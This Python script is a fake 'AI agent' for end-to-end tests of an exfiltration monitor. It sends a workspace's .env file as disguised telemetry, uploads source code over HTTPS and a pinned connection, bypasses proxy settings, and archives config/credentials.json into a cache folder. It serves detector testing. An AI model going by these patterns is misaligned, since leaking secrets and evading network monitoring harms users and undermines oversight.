"""A fake "AI agent" for end-to-end tests. Misbehaves in every way whatsent should catch.

Run with the canary workspace as cwd. Uses only the standard library.
"""

from __future__ import annotations

import argparse
import gzip
import io
import json
import os
import socket
import ssl
import tarfile
import time
import urllib.request
from pathlib import Path


def post(url: str, body: bytes, headers: dict | None = None, context: ssl.SSLContext | None = None) -> None:
    req = urllib.request.Request(url, data=body, method="POST", headers=headers or {})
    handlers = [urllib.request.ProxyHandler()]  # reads HTTP(S)_PROXY from the environment
    if context is not None:
        handlers.append(urllib.request.HTTPSHandler(context=context))
    with urllib.request.build_opener(*handlers).open(req, timeout=10) as resp:
        resp.read()


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--http")
    ap.add_argument("--https")
    ap.add_argument("--pinned")
    ap.add_argument("--pinned-ca")
    ap.add_argument("--direct")
    ap.add_argument("--cache-dir")
    a = ap.parse_args()
    cwd = Path.cwd()

    # 1. Plain HTTP: "telemetry" that includes the .env file.
    if a.http:
        post(a.http, json.dumps({"env": (cwd / ".env").read_text()}).encode(),
             {"Content-Type": "application/json"})

    # 2. HTTPS, gzip-encoded: the task file plus a directory listing.
    if a.https:
        listing = [str(p.relative_to(cwd)) for p in cwd.rglob("*") if ".git" not in p.parts]
        body = gzip.compress(json.dumps({"file": (cwd / "src/app.py").read_text(),
                                         "tree": listing}).encode())
        post(a.https, body, {"Content-Type": "application/json", "Content-Encoding": "gzip"},
             ssl.create_default_context())

    # 3. A pinned client that only trusts its own server certificate.
    if a.pinned:
        try:
            post(a.pinned, b"pinned", context=ssl.create_default_context(cafile=a.pinned_ca))
        except Exception:
            pass

    # 4. A connection that ignores the proxy settings.
    if a.direct:
        host, port = a.direct.rsplit(":", 1)
        with socket.create_connection((host, int(port))):
            time.sleep(1.0)

    # 5. A workspace snapshot left in a cache folder, plus an opaque "encrypted" blob.
    if a.cache_dir:
        cache = Path(a.cache_dir)
        cache.mkdir(parents=True, exist_ok=True)
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:gz") as tf:
            tf.add(cwd / "config/credentials.json", arcname="workspace/config/credentials.json")
        (cache / "snapshot.tar.gz").write_bytes(buf.getvalue())
        (cache / "upload.bin").write_bytes(os.urandom(300 * 1024))


if __name__ == "__main__":
    main()
